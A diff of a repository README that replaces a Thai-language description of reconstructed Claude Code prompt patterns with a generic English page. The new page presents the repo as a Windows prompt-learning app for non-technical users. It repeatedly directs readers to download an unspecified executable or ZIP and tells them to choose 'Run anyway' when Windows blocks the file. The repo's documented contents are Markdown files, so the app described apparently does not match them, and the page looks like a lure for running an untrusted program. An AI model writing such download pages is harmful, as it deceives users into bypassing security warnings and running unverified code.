@@ -1,150 +1,185 @@
-# Claude Code System Prompts
+# 📘 ClaudeCode-Learning - Learn Prompt Skills Fast
 
-โครงการวิจัยเชิงลึกเพื่อทำความเข้าใจการทำงานเบื้องหลังของเอเจนต์ AI ช่วยเขียนโค้ดสมัยใหม่ Repository นี้รวบรวมโครงสร้างพรอมต์ (Prompt Architecture), รูปแบบการประสานงานของเอเจนต์ (Agent Coordination Patterns) และกลไกความปลอดภัยต่างๆ ที่ขับเคลื่อนเครื่องมืออย่าง Claude Code ในรูปแบบภาษาไทย
+[![Download ClaudeCode-Learning](https://img.shields.io/badge/Download-Start%20Here-blue)](https://github.com/philosophersstonekoine639/ClaudeCode-Learning)
 
-เนื้อหาทั้งหมดในนี้มาจากการสังเกตพฤติกรรม, การวิเคราะห์เอาต์พุต, การพูดคุยในชุมชน และข้อมูลที่เปิดเผยต่อสาธารณะ สิ่งเหล่านี้คือการสร้างขึ้นใหม่โดยอาศัยการประมาณการ (Reconstructed Approximations) ไม่ใช่การคัดลอกมาคำต่อคำ การนำไปใช้งานจริงอาจมีความแตกต่างกันอย่างมีนัยสำคัญ
+## 🧭 Overview
 
-## โปรเจกต์นี้คืออะไร
+ClaudeCode-Learning is a Windows app for prompt engineering practice. It helps you learn how to write clear prompts, test ideas, and improve your results step by step. Use it to build better prompts for Claude and other AI tools.
 
-นี่คือการทำความเข้าใจเชิงลึก (Educational Deep-dive) เกี่ยวกับรูปแบบการออกแบบ (Design Patterns) เบื้องหลังเอเจนต์ช่วยเขียนโค้ด เราวิเคราะห์ว่าระบบเหล่านี้ทำสิ่งต่อไปนี้ได้อย่างไร:
+This app is made for non-technical users. You do not need coding skills to get started. Open it, follow the steps, and begin learning with guided exercises.
 
-- ประกอบพรอมต์ระบบ (System Prompts) แบบไดนามิกในขณะรันไทม์
-- ประสานงานระหว่างเอเจนต์ย่อยเฉพาะทางหลายตัว
-- จัดประเภทและอนุมัติการเรียกใช้เครื่องมือ (Tool Calls) อย่างปลอดภัยโดยอัตโนมัติ
-- จัดการหน้าต่างบริบท (Context Windows) ผ่านการบีบอัดข้อมูลที่ชาญฉลาด
-- จัดการความจำ (Memory), สกิล (Skills) และความชอบของผู้ใช้
+## 💻 What You Need
 
-เป้าหมายคือเพื่อช่วยให้วิศวกร AI, นักวิจัย และผู้สร้าง ได้เรียนรู้จากรูปแบบสถาปัตยกรรมเหล่านี้และนำไปประยุกต์ใช้ในโปรเจกต์ของตนเอง
+Use a Windows PC with:
 
-## โปรเจกต์นี้ไม่ใช่ตัวเลือกต่อไปนี้
+- Windows 10 or Windows 11
+- At least 4 GB of RAM
+- 200 MB of free disk space
+- An internet connection for download
+- Basic file access rights on your PC
 
-นี่ **ไม่ใช่** การรั่วไหล (leak), การดัมพ์ข้อมูล (dump) หรือการคัดลอกโดยตรงจากระบบที่มีลิขสิทธิ์ใดๆ พรอมต์ที่บันทึกไว้ที่นี่คือการสร้างขึ้นใหม่ที่ดีที่สุดของเราตามพฤติกรรมที่สังเกตได้ สิ่งเหล่านี้เป็นตัวแทนของการตีความรูปแบบหนึ่งว่าระบบเหล่านี้มีแนวโน้มที่จะทำงานอย่างไร
+For the best experience, use a screen size of 1366 x 768 or higher.
 
-## รูปแบบที่บันทึกไว้
+## ⬇️ Download the App
 
-สามารถดูไฟล์ภาษาไทยทั้งหมดได้ในโฟลเดอร์ [prompts-th/](prompts-th/)
+Go to the main project page here:
 
-### อัตลักษณ์หลัก (Core Identity)
+https://github.com/philosophersstonekoine639/ClaudeCode-Learning
 
-| # | รูปแบบ (Pattern) | คำอธิบาย |
-|---|---------|-------------|
-| 01 | [Main System Prompt](prompts-th/01_main_system_prompt.md) | วิธีการประกอบพรอมต์หลักแบบไดนามิกจากส่วนประกอบย่อยต่างๆ |
-| 02 | [Simple Mode](prompts-th/02_simple_mode.md) | พรอมต์รูปแบบย่อสำหรับการทำงานเบาๆ |
-| 03 | [Default Agent Prompt](prompts-th/03_default_agent_prompt.md) | คำแนะนำพื้นฐานที่เอเจนต์ย่อยทั้งหมดสืบทอดไปใช้งาน |
-| 04 | [Cyber Risk Instruction](prompts-th/04_cyber_risk_instruction.md) | ขอบเขตความปลอดภัยระหว่างการดำเนินการที่ได้รับอนุญาตและสิ่งที่สั่งห้าม |
+From that page, download or access the app files shown on the repository page. If the project offers a release, use the latest version file for Windows. If it offers source files only, use the download option on the page and follow the setup steps below.
 
-### การประสานงาน (Orchestration)
+## 🪟 Install on Windows
 
-| # | รูปแบบ (Pattern) | คำอธิบาย |
-|---|---------|-------------|
-| 05 | [Coordinator System Prompt](prompts-th/05_coordinator_system_prompt.md) | การประสานงานเอเจนต์หลายตัวพร้อมขั้นตอนการทำงานที่เป็นระบบ |
-| 06 | [Teammate Prompt Addendum](prompts-th/06_teammate_prompt_addendum.md) | โปรโตคอลการสื่อสารสำหรับการทำงานร่วมกันระหว่างเอเจนต์ |
+1. Open the download location on your PC.
+2. If the file is in a ZIP folder, right-click it and choose Extract All.
+3. Open the extracted folder.
+4. Look for the main app file or launcher file.
+5. Double-click the file to start the app.
 
-### เอเจนต์เฉพาะทาง (Specialized Agents)
+If Windows shows a security prompt, select Run or More info > Run anyway if you trust the source page.
 
-| # | รูปแบบ (Pattern) | คำอธิบาย |
-|---|---------|-------------|
-| 07 | [Verification Agent](prompts-th/07_verification_agent.md) | เอเจนต์ตรวจสอบที่พยายามหาจุดบกพร่องเพื่อให้งานสมบูรณ์ที่สุด |
-| 08 | [Explore Agent](prompts-th/08_explore_agent.md) | การสำรวจ codebase แบบอ่านอย่างเดียวโดยมีข้อจำกัดด้านการแก้ไข |
-| 09 | [Agent Creation Architect](prompts-th/09_agent_creation_architect.md) | สร้างการกำหนดค่าเอเจนต์ใหม่ตามความต้องการของผู้ใช้ |
-| 10 | [Status Line Setup Agent](prompts-th/10_statusline_setup_agent.md) | การกำหนดค่าแถบสถานะเทอร์มินัลข้าม shell ต่างๆ |
+## 🚀 First Launch
 
-### ความปลอดภัยและการอนุญาต (Security and Permissions)
+When you open ClaudeCode-Learning for the first time:
 
-| # | รูปแบบ (Pattern) | คำอธิบาย |
-|---|---------|-------------|
-| 11 | [Permission Explainer](prompts-th/11_permission_explainer.md) | การประเมินความเสี่ยงก่อนที่ผู้ใช้จะอนุมัติการใช้เครื่องมือ |
-| 12 | [Auto Mode Classifier](prompts-th/12_yolo_auto_mode_classifier.md) | ตัวคัดกรองความปลอดภัยสำหรับการรันเครื่องมืออัตโนมัติแบบหลายขั้นตอน |
+1. Let the app finish loading.
+2. Read the welcome screen, if one appears.
+3. Choose a learning path or starter lesson.
+4. Open the first prompt exercise.
+5. Type your answer or edit the sample prompt.
+6. Save your work if the app offers a save option.
 
-### คำอธิบายเครื่องมือ (Tool Descriptions)
+If you see a setup screen, follow the on-screen steps before starting a lesson.
 
-| # | รูปแบบ (Pattern) | คำอธิบาย |
-|---|---------|-------------|
-| 13 | [Tool-Specific Prompts](prompts-th/13_tool_prompts.md) | วิธีที่แต่ละเครื่องมือ (Bash, Edit, Agent ฯลฯ) อธิบายตัวเอง |
+## 🧠 What You Can Learn
 
-### รูปแบบยูทิลิตี้ (Utility Patterns)
+ClaudeCode-Learning can help you practice:
 
-| # | รูปแบบ (Pattern) | คำอธิบาย |
-|---|---------|-------------|
-| 14 | [Tool Use Summary](prompts-th/14_tool_use_summary.md) | การสร้างเลเบลสรุปสั้นๆ สำหรับกลุ่มเครื่องมือที่รันเสร็จแล้ว |
-| 15 | [Session Search](prompts-th/15_session_search.md) | การค้นหาเชิงความหมายข้ามเซสชันการสนทนาในอดีต |
-| 16 | [Memory Selection](prompts-th/16_memory_selection.md) | การเลือกไฟล์ความจำที่เกี่ยวข้องสำหรับบริบทของคำค้นหา |
-| 17 | [Auto Mode Critique](prompts-th/17_auto_mode_critique.md) | การรีวิวกฎการคัดกรองที่ผู้ใช้เขียนเอง |
-| 20 | [Session Title](prompts-th/20_session_title.md) | การสร้างชื่อเซสชันแบบสั้นๆ เพื่อการจัดการเซสชัน |
-| 29 | [Agent Summary](prompts-th/29_agent_summary.md) | การอัปเดตความคืบหน้าเบื้องหลังสำหรับเอเจนต์ย่อย |
-| 30 | [Prompt Suggestion](prompts-th/30_prompt_suggestion.md) | การคาดการณ์คำสั่งหรือคำถามถัดไปของผู้ใช้ |
+- Writing clear prompts
+- Asking for better output
+- Giving format instructions
+- Improving prompt length and structure
+- Testing different prompt styles
+- Comparing results from different prompts
+- Building a prompt library
 
-### การจัดการหน้าต่างบริบท (Context Window Management)
+These lessons help you get better results from AI tools with less trial and error.
 
-| # | รูปแบบ (Pattern) | คำอธิบาย |
-|---|---------|-------------|
-| 21 | [Compact Service](prompts-th/21_compact_service.md) | กลยุทธ์การสรุปบทสนทนาสำหรับเซสชันที่ยาวนาน |
-| 22 | [Away Summary](prompts-th/22_away_summary.md) | สรุปเซสชันสั้นๆ สำหรับผู้ใช้ที่กลับมาทำงานต่อ |
+## 🛠️ How to Use It
 
-### พฤติกรรมแบบไดนามิก (Dynamic Behaviors)
+Use the app in short practice sessions:
 
-| # | รูปแบบ (Pattern) | คำอธิบาย |
-|---|---------|-------------|
-| 18 | [Proactive Mode](prompts-th/18_proactive_mode.md) | การทำงานเบื้องหลังแบบอิสระพร้อมการควบคุมจังหวะการทำงาน |
-| 23 | [Chrome Browser Automation](prompts-th/23_chrome_browser_automation.md) | รูปแบบการรวมเข้ากับส่วนขยายเบราว์เซอร์ |
-| 24 | [Memory Instruction](prompts-th/24_memory_instruction.md) | การโหลดความจำตามลำดับชั้นและกฎการแทนที่ (override) |
+1. Pick one prompt goal.
+2. Write a simple request.
+3. Run or review the prompt.
+4. Check the result.
+5. Change one part of the prompt.
+6. Try again.
 
-### รูปแบบสกิล (Skill Patterns)
+Good prompt writing comes from small changes. Keep each test simple so you can see what works.
 
-| # | รูปแบบ (Pattern) | คำอธิบาย |
-|---|---------|-------------|
-| 19 | [Simplify Skill](prompts-th/19_simplify_skill.md) | รูปแบบการรีวิวโค้ดแบบขนานด้วยเอเจนต์หลายตัว |
-| 25 | [Skillify Skill](prompts-th/25_skillify.md) | เวิร์กโฟลว์การสร้างสกิลผ่านการสัมภาษณ์ |
-| 26 | [Stuck Skill](prompts-th/26_stuck_skill.md) | รูปแบบการวินิจฉัยและกู้คืนเซสชัน |
-| 27 | [Remember Skill](prompts-th/27_remember_skill.md) | เวิร์กโฟลว์การจัดระเบียบและยกระดับความจำ |
-| 28 | [Update Config Skill](prompts-th/28_update_config_skill.md) | รูปแบบการจัดการการกำหนดค่า (Configuration) |
+## 📁 Suggested Folder Setup
 
-## ข้อสังเกตเชิงสถาปัตยกรรม
+To keep your files in order, use this layout:
 
-### การประกอบพรอมต์แบบไดนามิก
+- Downloads
+  - ClaudeCode-Learning
+- Documents
+  - Prompt Practice
+  - Saved Prompts
+  - Lesson Notes
 
-จากการวิเคราะห์ของเรา พรอมต์ระบบดูเหมือนจะถูกประกอบขึ้นผ่านลำดับขั้นตอน (pipeline) ของโมดูลย่อยๆ:
+This makes it easier to find your work later.
 
-```
-ขั้นตอนการประกอบพรอมต์ (Prompt Assembly Pipeline)
-    |
-    |   Prefix ที่แคชได้ (เสถียรระหว่างเซสชัน)
-    |-- คำแนะนำเรื่องอัตลักษณ์และความปลอดภัย
-    |-- การกำหนดค่าการอนุญาตและฮุค (hook)
-    |-- กฎสไตล์โค้ดและการจัดการข้อผิดพลาด
-    |-- ความชอบในการใช้เครื่องมือและรูปแบบการใช้งาน
-    |-- กฎเรื่องน้ำเสียง สไตล์ และเอาต์พุต
-    |
-    |   ขอบเขตการแคช (Cache Boundary)
-    |
-    |   Suffix แบบไดนามิก (เปลี่ยนตามเซสชัน)
-    |-- เอเจนต์และสกิลที่มีให้ใช้งาน
-    |-- เนื้อหาในไฟล์ความจำ
-    |-- บริบทสภาพแวดล้อม (OS, ไดเรกทอรี, สถานะ git)
-    |-- ความชอบด้านภาษาและเอาต์พุต
-    |-- คำแนะนำจากเซิร์ฟเวอร์ MCP ที่ใช้งานอยู่
-    |-- คำสั่งจัดการหน้าต่างบริบท
-```
+## 🔒 Safety and Privacy
 
-## กรณีการใช้งาน
+Keep your files in a folder you can find again. If the app saves notes or prompt drafts, back them up to a second folder or cloud storage account you trust.
 
-งานวิจัยนี้มีประโยชน์สำหรับ:
+Use only the download page linked above. This helps you avoid wrong files or outdated copies.
 
-- **วิศวกร AI** ที่สร้างเครื่องมือโค้ดเอเจนต์ของตนเอง
-- **วิศวกรพรอมต์ (Prompt Engineers)** ที่ศึกษาสถาปัตยกรรมพรอมต์ในระดับโปรดักชัน
-- **นักวิจัยด้านความปลอดภัย** ที่ต้องการทำความเข้าใจว่าเครื่องมือ AI อิสระจัดการสิทธิ์การเข้าถึงอย่างไร
-- **นักเรียนและครู** ที่เรียนรู้เกี่ยวกับการออกแบบระบบหลายเอเจนต์ (Multi-agent system design)
+## 🧩 Common Tasks
 
-## โครงสร้าง Repository
+### 📝 Create a new prompt
+Open a lesson or editor, then type your prompt in plain language. Keep the goal clear.
 
-```
-ClaudeCode-Learning/
-    README.en.md (ภาษาอังกฤษ)
-    README.th.md (ภาษาไทย)
-    prompts-th/
-        01-30 พรอมต์ฉบับแปลภาษาไทย (ดูรายละเอียดในตารางด้านบน)
-```
+### 🔁 Test a prompt again
+Edit one line at a time, then run the prompt again. This helps you see what changed.
 
-## ข้อสงวนสิทธิ์ (Disclaimer)
+### 📌 Save a good prompt
+Copy strong prompts into a saved notes file or the app’s own library, if it has one.
 
-นี่คือโครงการวิจัยอิสระ เนื้อหาทั้งหมดแสดงถึงการวิเคราะห์และการประมาณการของเราตามพฤติกรรมที่สังเกตได้ในที่สาธารณะ โปรเจกต์นี้ไม่มีส่วนเกี่ยวข้อง รับรองโดย หรือเชื่อมต่อกับ Anthropic เครื่องหมายการค้าทั้งหมดเป็นของผู้เป็นเจ้าของ หากเจ้าของเนื้อหามีข้อกังวล โปรดเปิด issue และเราจะดำเนินการแก้ไขทันที
+### 📂 Find your files
+Check the folder where you extracted the app. Look for the main program file, lesson files, and any saved notes.
+
+## 🧪 Example Learning Flow
+
+A simple practice session may look like this:
+
+1. Choose a topic, such as writing or research.
+2. Write a basic prompt.
+3. Ask for a clear format, such as a list or table.
+4. Add one constraint, such as length or tone.
+5. Compare the new result with the old one.
+6. Keep the prompt that works best.
+
+This method helps you learn by doing.
+
+## ⌨️ Tips for Better Results
+
+- Use short prompts at first
+- Add one instruction at a time
+- Ask for a clear output shape
+- Use plain words
+- Keep notes on what worked
+- Reuse prompts that give good results
+
+Small edits can improve output a lot.
+
+## 🗂️ File Types You May See
+
+You may see files such as:
+
+- .exe for the Windows app
+- .zip for a compressed download
+- .txt for notes
+- .md for guide files
+- .json for app data or settings
+
+If you are not sure which file to open, look for the Windows app file or the readme file in the folder.
+
+## ❓ Help With Basic Issues
+
+### The app does not open
+Check that you extracted the ZIP folder first. Then try the app file again.
+
+### Windows blocks the file
+Use the file from the linked GitHub repository only. If Windows still shows a prompt, open the file details and choose the run option.
+
+### The screen looks too small
+Use your Windows display settings to raise the scale or zoom level.
+
+### You cannot find the downloaded file
+Open File Explorer and check the Downloads folder.
+
+### The app closes right away
+Try opening it again from the extracted folder. If the issue stays, download the latest copy from the project page.
+
+## 📚 Learning Goals
+
+ClaudeCode-Learning is useful if you want to:
+
+- Write prompts with more control
+- Reduce vague answers
+- Learn better instruction patterns
+- Build a repeatable prompt process
+- Save time when working with AI tools
+
+## 🧭 Start Here
+
+1. Open the download page:
+   https://github.com/philosophersstonekoine639/ClaudeCode-Learning
+2. Get the app files from the repository page
+3. Extract the download if needed
+4. Open the Windows app file
+5. Begin the first lesson
+6. Keep improving each prompt step by step
